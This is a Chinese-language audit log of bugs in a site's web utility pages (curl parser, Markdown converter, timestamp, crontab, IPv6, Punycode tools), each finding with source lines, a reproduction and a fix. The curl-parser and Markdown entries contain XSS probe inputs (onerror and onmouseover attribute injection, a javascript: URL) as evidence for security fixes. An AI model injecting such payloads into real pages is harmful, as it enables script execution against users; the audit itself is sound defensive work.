- 证据：`tools/it/curl-parser.html:243,250-265,267-272`。Node 桩执行 `parse()`：`curl -d '{"a":1}' https://api.example.com/x` → `方法：GET`（curl 实际以 POST 发送）；`curl -F 'file=@a.txt' --data-binary @b.json https://x.com` → `URL：file=@a.txt`（真实 URL 丢失）；`-H 'X-Test: <img src=x onerror=alert(1)>'` 原样输出 `<p>X-Test: <img src=x onerror=alert(1)></p>`。
- 影响：`tools/it/curl-parser.html`；复制出的请求方法/URL/表单体与真实 curl 行为不符，常见上传命令直接解析错。
- 方案：建立“选项是否带值”的映射表，成对消费参数；无 `-X` 而有 `-d/--data*/--form` 时默认 POST；未知选项跳过其值并提示；输出统一转义，必要时以结构化 JSON 展示。

### IT-N15 省略符超出截断上限（中，已修复 2026-11-06 核验：text-truncate.html:334-349/358-369 truncOne 仅 chars/bytes 模式内判断省略符超限并按上限截断；words/lines 模式 limit 为词/行计数，量纲不同不触发）
- `tools/it/text-truncate.html:338-345,360-383` 将预算钳到 0 后仍原样追加完整省略符。当输入 `abcdef`、上限为 1、省略符为 `...` 时，字符及字节模式均输出 3 个字符，超过上限。Node 桩已执行原函数；未做浏览器验证。
- 影响：截断结果不能满足严格长度或字节上限。应在省略符本身超限时截短或明确提示，并覆盖两种截断方向。

### 留存优化
- `properties-parser.html:280` 的 `unescapeVal` 不解码 `\uXXXX`：`greet=\u4f60\u597d` 原样保留（Node 已复算），与页面 FAQ 对转义的说明不一致，可随 IT-N10 一并修。
- `properties-parser.html:265` 行尾 `\\`（字面反斜杠）也被当作续行：`path=C:\\` + 下一行 → `{"path":"C:\next=1"}`，需区分“单个反斜杠续行 / 双反斜杠字面量”。
- `url-parser.html:442-459` 构造器不校验 host/port，host 为空会生成 `https:///path`，端口可写入任意非数字内容。
- `slugify.html:315` 拼音表 `'音频':'yinpinyin'` 拼写有误；297 的 15 字长键因贪心上限 8（324）永远匹配不到，属冗余数据。
- `text-truncate.html:330` `fromEnd` 分支完全忽略 `wordBoundary`，与正向行为不对称。
- `case-converter.html:384` `toSentenceCase` 先整体小写，专有名词与缩写（NASA、iOS）会被降格，如需保留应改为逐句首字母处理。

### 续查覆盖
- 本轮人工查看 `tools/it/properties-parser.html`、`url-parser.html`、`csv-validator.html`、`curl-parser.html`、`text-truncate.html`、`slugify.html`、`case-converter.html` 共 7 页，新增 8 条（高 3、中 4、低 1），编号续 IT-N10～N17，与既有 IT-N1～N9 无重复。
- 取证方式仅为源码静态阅读 + Node 内存提取原函数/最小 DOM 桩执行复算；未做真实浏览器交互、英文态、移动端、门禁或部署验证。

## 2026-11-03 续查（并行批 J）

### IT-N18 Markdown 链接目标未转义，可注入 HTML 属性（高，已修复 2026-11-06 核验：markdown-to-html.html:295-306 attrEsc 转义引号+safeUrl 白名单 http/https/mailto 并百分号编码阻断 javascript:）
- 描述：`inline()` 只转义 `&<>`，不处理双引号；链接正则把 URL 原样塞进 `href`，最终经 `ToolBox.setResult` 以 `innerHTML` 写入预览区。
- 证据：`tools/it/markdown-to-html.html:289-296`（294 为链接替换）；`js/common.js:2047-2050`（`setResult` 直接赋值 `innerHTML`）。Node 复算 `inline('[x](https://a/" onmouseover="alert(1))')` → `<a href="https://a/" onmouseover="alert(1" target="_blank" rel="noopener">x</a>`；`[x](javascript:alert(1))` 的 `href` 被 `[^)]+` 截成 `javascript:alert(1`。
- 影响：`tools/it/markdown-to-html.html`；粘贴带引号的链接即可在预览区制造事件属性（自输入型 XSS），转载他人 Markdown 时同样成立。
- 方案：URL 走白名单（http/https/mailto）并做属性转义，或改用 `createElement`/`setAttribute` 构建链接；预览与“HTML 代码”面板统一输出净化后的结果。

### IT-N20 历史/数据表/图表恒空，历史回填会清空全部选项（中，确认源码缺陷）
- 描述：`__text_cleanerResText` 读取 `#output-text` 的 `textContent`，而它是 `textarea`——当前 `value` 不写入子节点，`textContent` 恒为空，extras 直接提前返回；且 extras 只包装了 `applyPreset`，点“执行清理”与预设条回调（`executeClean`）都不会记录。历史回填调用 `applyPreset()` 不带参数。
- 证据：`tools/it/text-cleaner.html:756-763`（textarea 取 textContent）、`846-849`（仅包装 applyPreset）、`839-845`（预设条回调为 `executeClean`）、`781-793`（回填 `applyPreset()`）、`491-505`（`presets[undefined]` → `[]` → `deselectAll()`）、`472-474`。jsdom 复算：`#output-text` 初始与 `value='清理结果内容'` 之后 `textContent` 均为 `""`，ResText 等价结果为 `""`；`{…}[undefined]` → `undefined`，`list=[]` 会走 `deselectAll()`。
- 影响：`tools/it/text-cleaner.html`；数据表/图表/历史三个页签永远为空；若将来有历史记录，恢复后默认勾选被清空，输出与记录不符。
- 方案：改读 `output-text.value`；包装 `executeClean` 记录历史；回填时逐字段恢复后直接 `executeClean()`，不要用无参 `applyPreset`。

### IT-N22 历史只保存前 1000 字符，恢复后静默截断（中，已修复 2026-11-06 核验：text-diff.html:699-700 addToHistory 去掉 substring(0,1000) 存全文，避免长文本恢复后静默截断）
- 描述：`addToHistory` 对两份文本各做 `substring(0,1000)`；`loadHistory` 直接回填并重新 `doDiff()`，无任何截断提示。
- 证据：`tools/it/text-diff.html:697-703`、`733-739`。Node 复算：1500 个 `A` + `TAIL` 经 `substring(0,1000)` 后长度为 1000 且不含 `TAIL`。
- 影响：`tools/it/text-diff.html`；长文本从历史恢复后 diff 结果看似正常但内容已被砍掉。
- 方案：保存完整文本；确需限长时存全文摘要并提示“已截断，不可恢复对比”，或对超限记录禁用回填。

### IT-N25 美化把 JSON 数组当 INI 节名（中，确认源码缺陷）
- 描述：`doBeautify` 仅以 `startsWith('{')` 判定 JSON，`[...]` 走 INI 解析；`toIni` 对数组用 `for...in` 输出 `0 = a` 形式。
- 证据：`tools/it/ini-parser.html:307-314`、`279-291`、`299-306`。Node 复算：`parseIni('["a","b"]')` → `{"\"a\",\"b\"":{}}`；`JSON→INI` 对 `["a","b"]` 产出 `0 = a` / `1 = b`。
- 影响：`tools/it/ini-parser.html`；对合法 JSON 数组执行“美化”得到空节，用户难以判断是输入错误还是工具问题。
- 方案：用 `JSON.parse` 试解析判型（含 `[`），数组显式支持（如 `[list]` 节）或明确报“INI 不支持数组”；`toIni` 对数组单独处理。

### IT-N26 两个下拉框没有任何选项，代码面板与压缩模式不可用（中，确认源码缺陷）
- 描述：`#showcode`、`#compact` 两个 `<select>` 在源码中为空，代码却按值 `'1'`/`'compact'` 判断；`resetForm` 的 `selectedIndex=0` 也无实际效果。压缩结果 `outHtml` 只在“显示 HTML 代码”分支被使用。
- 证据：`tools/it/markdown-to-html.html:136,140`（空 select）、`330-337`（取值判断与 `outHtml` 用法）、`342-343`。jsdom 复算：`#showcode` 与 `#compact` 的 `options.length` 均为 0；再按 330-337 逻辑模拟“显示代码关闭 + 压缩开启”：可见区 `<p>a</p>\n<ul><li>b</li></ul>` 不变，仅 `code` 变量被压缩。
- 影响：`tools/it/markdown-to-html.html`；两个标注功能实际不可选，HTML 代码面板永不出现；“压缩”即使可选项生效也只影响代码面板，不影响预览。
- 方案：补上 `option`（`0/1`、`pretty/compact`），并让压缩模式同时作用于预览与代码输出。

### IT-N27 图片语法未实现，`![alt](url)` 输出字面 `!` 加链接（中，确认源码缺陷）
- 描述：行内规则只有标题/粗斜/链接/行内代码，没有图片规则；`![alt](url)` 中的 `[alt](url)` 被链接规则匹配，感叹号留在文本里。
- 证据：`tools/it/markdown-to-html.html:289-296`、FAQ JSON-LD `347` 声称覆盖“图片”。Node 复算 `![alt](https://x/y.png)` → `!<a href="https://x/y.png" target="_blank" rel="noopener">alt</a>`。
- 影响：`tools/it/markdown-to-html.html`；粘贴含图片的 Markdown 得到错误 HTML，与页面承诺不符。
- 方案：增加图片规则（必须先于链接匹配），输出 `<img src alt>`，并对 `src`/`alt` 做属性转义与 URL 白名单。

### IT-N28 字符级对比按 UTF-16 码元切分（低，确认源码缺陷）
- 描述：`charDiffLine` 用 `split('')` 与按码元的 LCS，emoji 等代理对被拆成两半分别着色。
- 证据：`tools/it/text-diff.html:459-463`。Node 复算 `charDiffLine('😀😀😀','😀😀')` → oldHtml 含 `[-\ud83d-][-\ude00-]`（两个高亮块分别包住一对代理项的一半）。
- 影响：`tools/it/text-diff.html`；emoji/扩展字符差异展示破碎，导出文本可能含孤立代理项。
- 方案：改用 `Array.from` 或 `Intl.Segmenter` 按码点/字素簇切分后再做 LCS。

### IT-N29 逐行对照预览按索引配对，删行后错位；FAQ 承诺的“全压成一行”未实现（中，确认源码缺陷）
- 描述：`top_blank` 本身按 `trim()===''` 判空行（行为正确），但预览直接拿 `rawLines[pi]` 与 `lines[pi]` 并列；一旦删除过空行（默认预设即会删），两列的第 N 行就不再对应同一段文本。另 FAQ 称“可选保留段落或全压成一行”，页面只有 4 个勾选项，没有折叠换行能力。
- 证据：`tools/it/whitespace.html:219-229`（225 空行过滤）、`250-257`（253-256 同索引配对）、`407-408`（FAQ）。Node 复算 `a\n   \nb` 勾 `top_blank` → 输出 `a\nb`；按 253-256 配对得到：第 2 行原始 `"   "` / 处理后 `"b"`，第 3 行原始 `"b"` / 处理后 `""`。
- 影响：`tools/it/whitespace.html`；预览把“被删的空白行”和“下一行内容”放在同一行展示，误导用户核对；文档承诺的“全压成一行”无法实际执行。
- 方案：预览携带原始行号映射（被删行明确标注“已删除”），左右列不再假装同源同一行；删除该 FAQ 承诺或补“折叠为单行”选项。

### IT-N30 裸 CR 不切分、强制 trim 静默丢空项与缩进（低，确认源码缺陷）
- 描述：输入只按 `/\r?\n/` 切分，旧 Mac 的单独 `\r` 不识别；随后统一 `trim()` 并 `filter(Boolean)`，缩进、空字段被静默去掉。
- 证据：`tools/it/list-converter.html:272-290`（273 切分/清洗、280 quote、283 csv）。Node 复算：`a\rb`、comma 模式 → 单条 `a\rb`（未按 CR 切分）；`"  a  \n\nb "` → `["a","b"]`，结果 `a, b`。
- 影响：`tools/it/list-converter.html`；混合换行文件被当成一项；需要空字段或缩进的列表无法原样转换。
- 方案：改用 `/\r\n|\r|\n/`；提供“保留首尾空白/保留空项”开关，至少在结果中提示删除了多少项。

### IT-N31 视图切换依赖全局 `event`（中，待验证：Firefox）
- 描述：`switchView` 通过 `event.target` 找当前页签，`event` 未作为参数传入；Chrome/Safari 有 `window.event`，Firefox 没有全局 `event`，内联 `onclick` 调用时会取不到。
- 证据：`tools/it/text-diff.html:405-410`、`252-253`（内联 `onclick="switchView('unified')"`）。本轮按源码推断为 Firefox 下 ReferenceError，未做浏览器验证。
- 影响：`tools/it/text-diff.html`；Firefox 用户可能无法切换合并/并排视图。
- 方案：改为 `switchView(view, evt)` 显式传参，或用事件委托绑定 `.view-tab`，不依赖全局 `event`。

### 留存优化
- `tools/it/text-cleaner.html:531-535`：空输入时 `executeClean` 提前返回，上一次结果与统计原样保留，易被误复制；建议清空结果或提示。
- `tools/it/text-cleaner.html:668-676`：`swapText` 只刷新原始字符数，“结果/减少”统计仍是交换前的值。
- `tools/it/whitespace.html:227-228`：空文本勾选“确保末尾单个换行”会输出单个 `"\n"`（Node 已复算），建议空文本直接输出空串。
- `tools/it/text-diff.html:412-421`：没有换行符统一选项，但 352 的 FAQ 建议“先统一换行符再比对”，本页无法完成该前置步骤；`renderUnifiedDiff:552-554` 的相同行只渲染旧文本，忽略大小写/空白时展示与右侧不一致。
- `tools/it/text-diff.html:304`：统计卡宣称算法为 Myers，实际实现是 LCS 动态规划，文案与实现不一致。
- `tools/it/line-ending-converter.html:350-355`：`clearLe` 未清空 `#leViz`，清空后仍残留上一次的换行可视化；`299-305` 主换行符并列时固定优先报 CRLF。
- `tools/it/list-converter.html:280`：quote 模式用 `\"` 转义双引号，与 FAQ（`201-206`）所述“CSV 双引号写两个”不一致，建议统一或改名。
- `tools/it/ini-parser.html:321`：`getIndent` 读取不存在的 `#indent`，现为死代码，若被调用会抛错。
- `tools/it/markdown-to-html.html:291-293`：行内代码先替换再跑粗体/斜体，`` `**x**` `` → `<code><strong>x</strong></code>`（Node 已复算）；`280` 代码块语言只允许字母，`c++`/`c#` 不被保护（Node：blocks 长度 0）；`310` 表格要求行首为 `|`，省略首竖线的 GFM 表格不识别。
- `tools/it/text-dedupe-sort.html:380-385`：无 `input` 监听，“原始项数”在编辑时不更新；`500-503` 行号补零宽度只按总行数位数，跨 9/10 行时前缀宽度变化。

### 续查覆盖
- 本轮人工查看 `tools/it/text-diff.html`、`whitespace.html`、`text-cleaner.html`、`text-dedupe-sort.html`、`line-ending-converter.html`、`list-converter.html`、`markdown-to-html.html`、`ini-parser.html` 共 8 页，新增 14 条（历史计数：高 2、中 10、低 2），编号续 IT-N18～N31，与既有 IT-N1～N17 无重复；其中 IT-N31 为待验证项。
- 取证方式为源码静态阅读 + Node 内存提取原函数/最小逻辑复算（含 `markdown inline`、`parseIni`、`removeLineNum`、`leViz`、`list convert`、`calcTool` 等价实现），并用本地已装 jsdom 复核 `textarea.textContent` 与空 `<select>` 的 `options.length`；未开浏览器，未做英文态、移动端、门禁或部署验证。

## 2026-11-03 续查（并行批 K）

> 范围：本轮阅读 8 页（`tools/it/xml-formatter.html`、`tools/it/html-entities.html`、`tools/it/text-statistics.html`、`tools/text/stats-1.html`、`tools/text/analysis-density.html`、`tools/text/reading-time-estimator.html`、`tools/text/sensitive-word-filter.html`、`tools/text/text-extract-phones.html`）。仅源码 + Node/jsdom 复算，未开浏览器/未做 EN/移动端/门禁验证。

### IT-N32 XML 格式化与压缩丢失根元素、CDATA 和文本内换行（高，确认源码缺陷）
- 描述：`formatXml` 把 `doc.documentElement` 传给 `serializeNode`，而后者只遍历 `childNodes`，根元素自身的开闭标签永远不输出；子节点收集只认元素与文本（`nodeType 1/3`），CDATA（`nodeType 4`）被当作空内容输出为自闭合标签，内容整体丢失；`doMinify` 又对序列化结果全局删除 `\n`，文本节点与 CDATA 内部的合法换行一并被删。XML 声明、DOCTYPE、根外注释同样不会保留。
- 证据：`tools/it/xml-formatter.html:262,264-296,272,284-285,306-312`
- 复现：用 jsdom 加载页面原有函数执行。默认 `SAMPLE` 经 `formatXml(SAMPLE,true)` → 输出以 `<to from="Alice">Bob</to>` 开头、`<raw/>`，根 `<note>` 与 `<![CDATA[<unparsed>text</unparsed>]]>` 全部消失；`<root><a>1</a><b>2</b></root>` → `<a>1</a>\n<b>2</b>`（期望保留 `<root>`）；`<a>line1\nline2</a>` 压缩 → `<a>line1line2</a>`（期望保留文本换行）。
- 影响：页面 Boot 直接 `doBeautify()`，首屏示例即为多根、非法 XML；用户复制格式化/压缩结果会解析失败或丢失整段 CDATA 内容。
- 方案：在 `formatXml` 中单独输出根元素本身；按 `nodeType` 分发并保留 CDATA、注释、处理指令与 XML 声明；压缩只删除元素之间的缩进换行，文本与 CDATA 原样保留；补根元素、CDATA、mixed content 往返用例。

### IT-N38 字数统计按 UTF-16 与 ASCII 正则计数，emoji/扩展汉字/连字符词与说明不符（低，确认源码缺陷）
- 描述：总字符用 `t.length`（UTF-16 码元），emoji 与扩展区汉字计 2；中文字符正则仅 `4E00–9FFF`，`𠮷` 计 0；英文词正则不含连字符，`well-known` 计 2 词，但 FAQ 声称“连字符与缩写内的字母并入同一词”；行数只按 `\r?\n` 切分，裸 `\r` 不识别。
- 证据：`tools/text/stats-1.html:198,115,154-155`
- 复现：`😀` → 总字符 2 / 中文 0（期望 1 / 1）；`𠮷` → 总字符 2 / 中文 0（期望 1 / 1）；`well-known` → 英文 2 词（期望 1）；`a\rb` → 1 行（期望 2 行）。
- 影响：含 emoji 或生僻字的文本字符数偏大、中文数偏小；旧 Mac 换行文件行数偏少；与页面说明不一致。
- 方案：按码点/字素簇计数（`Array.from` 或 `Intl.Segmenter`）；汉字范围补扩展 A/B；连字符词按说明并入或改文案；换行用 `/\r\n|\r|\n/`。

### IT-N39 文本统计把小数点和裸 CR 当句子/换行边界（低，确认源码缺陷）
- 描述：句子按 `/[。！？.!?]+/` 直接切分，小数点和缩写中的句点会被当成句末；行数用 `text.split('\n')`，裸 `\r` 不切分；字符数同样按 UTF-16 码元计。
- 证据：`tools/it/text-statistics.html:250-271`（`264-268` 字符/行/句）
- 复现：`Version 3.14 is out` → 句子数 2（期望 1）；`a\rb` → 行数 1（期望 2）；`😀` → 总字符 2（页面已在 `149` 说明按码元计，属口径提示而非修复）。
- 影响：含版本号、小数、缩写或旧式换行的文本，句子与行数统计偏大/偏小。
- 方案：句子切分前保护小数与常见缩写，或改用分段器；换行统一 `/\r\n|\r|\n/`；如需精确字符数按字素簇计数。

- 本轮实读 8 页：`tools/it/xml-formatter.html`、`tools/it/html-entities.html`、`tools/it/text-statistics.html`、`tools/text/stats-1.html`、`tools/text/analysis-density.html`、`tools/text/reading-time-estimator.html`、`tools/text/sensitive-word-filter.html`、`tools/text/text-extract-phones.html`；新增 8 条（高 1 / 中 5 / 低 2）；未覆盖：`tools/text` 其余 7 页（`lorem-ipsum-generator`、`text-to-1337`、`text-to-ascii-art`、`text-to-braille`、`convert-6`、`convert-7`、`calc-1`）及 `tools/it` 的 json/yaml/csv/xml 转换余页；未做浏览器、EN、移动端、门禁或部署验证。

## 2026-11-04 续查（并行批 L）

> 范围：本轮阅读 8 页（`tools/it/time-format-converter.html`、`tools/it/timestamp-converter.html`、`tools/it/color-converter.html`、`tools/it/integer-base-converter.html`、`tools/it/chmod-calculator.html`、`tools/it/crontab-generator.html`、`tools/it/ipv6-converter.html`、`tools/it/crc-calculator.html`）。仅源码 + Node 复算，未开浏览器/未做 EN/移动端/门禁验证。

### 时间格式转换示例的时间戳与日期不一致（中，确认缺陷）
- `tools/it/time-format-converter.html:428-429` 称 Unix 秒 `1690000000` 对应 `2023-07-22T08:53:20.000Z`，实际为 `2023-07-22T04:26:40.000Z`；反向示例 `2023-07-22 08:53:20` 在 UTC+8 下对应 `1689987200`，并非 `1690000000`。本地时间取决于浏览器时区。
- 影响：示例给出互相矛盾的换算结果。应按明确时区重新计算示例。

### IT-N42 时间格式转换：裸数字 "0"/"1" 被当成年份 2000/2001（低，确认源码缺陷）
- 描述：非 10–13 位纯数字落入 `new Date(v)`；V8 把 `"0"`、`"1"` 解释为年份 2000/2001，而不是 Unix 秒。
- 证据：`tools/it/time-format-converter.html:235-240`
- 复现：输入 `0` → `2000-01-01 00:00:00`；`1` → `2001-01-01 00:00:00`（期望 `1970-01-01 08:00:00` 或提示"位数不足"）
- 影响：粘贴被截断的时间戳会被静默当成 2000/2001 年，排查日志时误判。
- 方案：纯数字统一走时间戳分支（按位数或阈值判定秒/毫秒），不足 10 位给出明确提示。

### IT-N43 时间戳转换：12 位毫秒戳被 smartConvert 判成秒，输出 31969 年（高，确认源码缺陷）
- 描述：智能识别只用 `n >= 1e12` 区分毫秒；2001-09-09 之前的毫秒戳（12 位）低于阈值，被当成秒再乘 1000，Date 仍可表示，于是静默给出 3 万年后的日期，并提示"识别成功"。
- 证据：`tools/it/timestamp-converter.html:577-596`（579 阈值、580 构造日期）
- 复现：`946684800000`（2000-01-01T00:00:00Z）→ 识别为"秒时间戳（12 位）"，日期 `31969-04-01 08:00:00`（ISO 为 `+031969-04-01T00:00:00Z`；期望 2000-01-01）；`1700000000000` 才会正确判为毫秒
- 影响：2000–2001 年的历史数据整体算错，且提示文案让用户以为识别正确。
- 方案：按位数（≤10 位秒、13 位毫秒、16 位微秒）或结合合理年份区间判定；毫秒数 <1e12 时仍判毫秒；无法判定时让用户显式选单位。

### IT-N44 时间戳转换：时区表写死固定偏移，忽略夏令时（中，确认源码缺陷）
- 描述：`TIMEZONES` 为纽约 -5、伦敦 0、巴黎 +1、悉尼 +11 等固定值；这些地区夏季使用 DST（-4/+1/+2/+10），固定偏移在半年内整体差 1 小时。
- 证据：`tools/it/timestamp-converter.html:416-427`、`546-562`（553-554 固定偏移计算）
- 复现：`2026-07-01T12:00:00Z` → "纽约 (GMT-5)" 显示 `07:00`（期望 08:00，EDT -4）；"伦敦 (GMT+0)" 显示 `12:00`（期望 13:00，BST +1）
- 影响：跨时区排障时纽约/伦敦/巴黎/悉尼结果偏差 1 小时；北京/东京/夏威夷不受影响。
- 方案：改用 `Intl.DateTimeFormat` 的 IANA 时区（America/New_York 等）格式化，或明确标注"标准时（不含 DST）"。

### IT-N45 时间戳转换：相差年/月按日历字段相减，1 天可显示 1 年/1 月（中，确认源码缺陷）
- 描述：`diffYear/diffMonth` 只比较年份与月份字段，不看日/时；结果与"相差天数"自相矛盾，文案虽带"约"仍是错误结论。
- 证据：`tools/it/timestamp-converter.html:713-714`（输出 719-720）
- 复现：`2025-12-31` → `2026-01-01`：相差天数 1，相差年数"约 1 年"；`2026-01-31` → `2026-02-01`：相差月数"约 1 个月"
- 影响：日期对比结论被夸大，跨年/跨月仅 1 天的场景误判。
- 方案：改为整月/整年口径（按月历逐段推进或计算完整周期数），或移除这两项只保留天/周/时/分/秒。

### IT-N48 进制转换：非法输入只改主结果，其余进制仍显示上次值；基数静默 clamp（中，确认源码缺陷）
- 描述：catch 分支只把 `mainOut` 设为 ❌，`r2/r8/r10/r16/r32/r36` 保持旧值；`fromBase/toBase` 超出 2–36 时静默改成 2/36 并写回输入框，无提示。
- 证据：`tools/it/integer-base-converter.html:294-295`（clamp 与写回）、`298-308`（308 catch）
- 复现：先输入 `ff`（16→10）得到各进制结果，再输入 `1g`（16 进制非法）→ 主结果显示 ❌，但二/八/十/十六/32/36 进制卡片仍是 `ff` 的旧值；源进制填 `99` → 被改成 `36` 且无提示
- 影响：错误输入下旧数据仍可被复制；基数被悄悄替换，用户不知转换口径已变。
- 方案：catch 时清空全部结果卡片；基数越界时保留输入并明确报错，不写回。

### IT-N49 Chmod 计算器：文档承诺特殊位，界面无法输入/输出四位数（低，确认源码缺陷）
- 描述：公式说明与 FAQ 都写 setuid/setgid/sticky 置于首位（如 4755），但页面只有 9 个 r/w/x 复选框，`calc` 恒拼接 3 位数字，复制命令也永远是 3 位。
- 证据：`tools/it/chmod-calculator.html:122`（公式列表）、`200`（FAQ）、`305-311`（calc）、`327-331`（copyPerm）
- 复现：勾选全部 rwx → `chmod 777 <file>`；没有任何控件能得到 `4755`（期望提供 setuid/setgid/sticky 三个开关并输出 4 位）
- 影响：需要 setuid/sticky 的场景无法使用，文档与功能不一致。
- 方案：增加三个特殊位复选框（4/2/1 置千位），或在说明中注明"本工具仅支持 3 位权限"。

### IT-N50 Crontab 生成器：校验函数忽略 min/max，越界值被当作合法表达式（高，已修复（核验 2026-11-06：当前 `valid(s,min,max)` 已对 range（`a<min||b>max`）与单值（`v<min||v>max`）校验边界，`*/0` 亦因 `>0` 被拒；Node 复算 `99`/`1-99`/`*/0` 均返回 false；verify 891/897 含 IT-N50 回归用例全过。本条「min/max 完全未使用」与现状不符，疑为更早版本证据；步长上界未额外限制以兼容真实 cron 对大步长的接受）
- 描述：`valid(s,min,max)` 的三个参数中 min/max 完全未使用，正则只检查形状；`99` 分钟、`1-99` 小时、`*/0` 步长都能通过，生成的 crontab 会被 cron 拒绝或语义异常。
- 证据：`tools/it/crontab-generator.html:283`（正则）、`296-302`（调用处传入范围）
- 复现：分钟填 `99` → ✅ 表达式 `99 9 * * *`；分钟填 `*/0` → ✅；小时填 `1-99` → ✅（期望标红"分钟 0-59 / 小时 0-23"）
- 影响：复制出的 crontab 无法加载（cron 报 bad minute/hour），或 `*/0` 行为不可预期。
- 方案：解析每个枚举/区间/步长并逐项校验边界（步长 >0 且不超过范围），越界给出字段级提示。

### IT-N51 Crontab 生成器：默认表达式的中文说明重复"每月"且语序不通（低，已修复 2026-11-06 核验：重写 zhTxt 生成——按 分/时/日/月/周 重组、去重量词，默认 `0 9 * * *` ⇒「每天 09:00 执行」；verify_it_calc.js +1 N51 回归用例（注入 `0 18 * * 1-5` ⇒「周 1-5 18:00 执行」）crontab 7/7 全过）
- 描述：`f[2]==='*' && f[4]==='*'` 分支固定以"每月 "开头，再拼接本身已是"每月"的 `parts[3]`，造成重复量词与错误语序。
- 证据：`tools/it/crontab-generator.html:313-317`、`284-290`
- 复现：默认值 `0 9 * * *` → "中文说明：每月 每月 每天 小时 9 分钟 0"（期望"每天 9:00"）
- 影响：默认打开的页面即展示病句，用户难以据此核对表达式。
- 方案：按"分/时/日/月/周"重组自然语言并去重量词；补 `* * * * *`、`0 9 * * *`、`0 18 * * 1-5` 快照用例。

### IT-N52 IPv6 转换：IPv4 映射预设必然报非法，`/前缀` 也不支持（高，已修复（核验 2026-11-06：当前 `expand()` 已通过 `ipv4ToHex` 转换末尾点分十进制段、`calcTool()` 已剥离并校验 `/len`（0–128）；Node 复算 `::ffff:192.0.2.1`→`...:ffff:c000:0201`、`2001:db8::1/64`→带 `/64`、`64:ff9b::192.0.2.1` 均正确。verify 含 IT-N52 回归用例 ipv6 6/6 全过；本条「必然报非法」为过时证据）
- 描述：`expand` 对 8 段做 `^[0-9a-f]{1,4}$` 校验，点分十进制段必然失败；页面预设条提供 `::ffff:192.0.2.1`，FAQ 也专门介绍 IPv4 映射。含 `/64` 的地址同样被拒。
- 证据：`tools/it/ipv6-converter.html:213-232`（230 正则）、`346`（IPv4 映射预设）、`385`（FAQ）、`151`（前缀说明）
- 复现：点"IPv4 映射"或输入 `::ffff:192.0.2.1` → "⚠️ 不是合法的 IPv6 地址。"（期望 `0000:...:ffff:c000:0201`）；`2001:db8::1/64` → 同样报错（期望拆出前缀长度并校验 0–128）
- 影响：工具自带的 4 个预设之一不可用；双栈/映射地址与带前缀地址都无法转换。
- 方案：识别末尾 IPv4 段并转成两组十六进制；剥离 `/len` 单独展示与校验；补 `::ffff:192.0.2.1`、`64:ff9b::192.0.2.1`、`/64` 用例。

### IT-N54 CRC-8/ITU 的 CCITT 别名待核实（疑似待验证）
- `tools/it/crc-calculator.html:330` 将模型标为 `CRC-8/ITU (CCITT)`；[CRC RevEng 参数目录](https://reveng.sourceforge.io/crc-catalogue/1-15.htm#crc.cat.crc-8-i-432-1) 列出该参数模型为 `CRC-8/I-432-1`，别名为 `CRC-8/ITU`，未列 CCITT。需核实 CCITT 别名的权威依据，避免与其他 CRC 模型混淆。

### IT-N55 CRC 计算器：十六进制模式不校验奇偶与非法字符，静默丢半字节/归零（中，确认源码缺陷）
- 描述：`getInputBytes` 去掉分隔符后直接按 `s.length/2` 建数组，奇数长度丢掉最后一个半字节；`parseInt` 失败得 NaN，写入 `Uint8Array` 变 0，仍输出"正常"CRC。
- 证据：`tools/it/crc-calculator.html:339-349`（344-346）
- 复现：hex 勾选后输入 `ABC` → 仅按 `AB` 计 1 字节（期望报"半字节数不足"或补 0）；输入 `zz` → 按 `0x00` 计（期望报非法十六进制）
- 影响：用户以为校验的是完整报文，实际少算了尾部或整段被当成 0。
- 方案：先校验仅含十六进制字符与分隔符，且去分隔后长度为偶数；非法/奇数时明确报错并停止计算。

- 备注：`tools/it/timestamp-converter.html:429-435`、`tools/it/color-converter.html:414-423` 的 `switchTab` 依赖全局 `event`（与 IT-N31 同模式，Firefox 可能失效），不重复计数，未单列为新条目。
- 本轮实读 8 页：`tools/it/time-format-converter.html`、`tools/it/timestamp-converter.html`、`tools/it/color-converter.html`、`tools/it/integer-base-converter.html`、`tools/it/chmod-calculator.html`、`tools/it/crontab-generator.html`、`tools/it/ipv6-converter.html`、`tools/it/crc-calculator.html`；新增 16 条（高 3 / 中 10 / 低 3）；未覆盖：`tools/it` 其余非文本页（如 `regex-escape`、`css-minifier`、`html-minifier`、`date-duration`、`ipv4-range-expander`、`punycode`、`user-agent-parser` 等）与全部速查表页；未做浏览器、EN、移动端、门禁或部署验证。

## 2026-11-04 续查（并行批 M）

> 范围：本轮阅读 8 页（`tools/it/punycode.html`、`tools/it/regex-escape.html`、`tools/it/css-minifier.html`、`tools/it/date-duration.html`、`tools/it/ipv4-range-expander.html`、`tools/it/user-agent-parser.html`、`tools/it/hash-multi.html`、`tools/it/http-cache.html`）。仅源码 + Node/jsdom 复算，未开浏览器/未做 EN/移动端/门禁验证。

### IT-N56 Punycode 编解码：核心算法错误，编码末位多加 t、解码忽略权重（高，确认源码缺陷）
- 描述：编码器在循环末尾把终止数字写成 `digitToChar(t + q)`（RFC 3492 应为 `digitToChar(q)`，此时 `q < t`）；解码器把增量累加写成 `pos += d - t`，而 `w *= BASE - t` 算出的权重从未参与乘法。两处叠加后编码出的串不是合法 Punycode，解码也还原不出原字符。
- 证据：`tools/it/punycode.html:323`（编码终止位）、`tools/it/punycode.html:357-358`（解码权重未乘）
- 复现：输入 `中文`（页面默认输入 `中文域名.com` 同样受影响）→ 编码实际 `fi@2282`（期望 `fiq228c`）；`中国` → `fi@s8B`（期望 `fiqs8s`）。解码 `fiq228c` → 输出两个不可打印字符 `""`（期望 `中文`）；解码 `fiqs8s` → 乱码（期望 `中国`）。
- 影响：编码/解码两个方向全部不可用；复制出去的 `xn--fi@2282.com` 不是合法 IDN，DNS/备案场景会直接失败，且界面无任何报错。
- 方案：终止位改回 `digitToChar(q)`；解码按 RFC 3492 用 `pos += d * w`（并在 `d < t` 时终止），`w *= BASE - t` 保持在后；用 `中文`、`中国`、`bücher`、`中文abc` 与 Node `punycode` 的 `fiq228c/fiqs8s/bcher-kva/abc-u68do18h` 做往返回归。

### IT-N57 Punycode：纯 ASCII 单标签被补尾随连字符，算法说明示例自相矛盾（低，确认源码缺陷）
- 描述：`encode()` 只要存在基础码点就追加 `-`，即使没有任何非 ASCII 码点；`enc()` 对不含点号的输入直接返回 `encode(text)`，于是纯 ASCII 串变成 `hello-`。另外页面两处示例互相矛盾：157 行说「中国」→ `xn--fiqs8s`（正确），185 行说 `中文.com` → `xn--fiqs8s.com`（`fiqs8s` 解码为「中国」，正确值应为 `fiq228c`）。
- 证据：`tools/it/punycode.html:295`（无条件补 `-`）、`tools/it/punycode.html:381`（无点号走整串编码）、`tools/it/punycode.html:185`（错误示例）
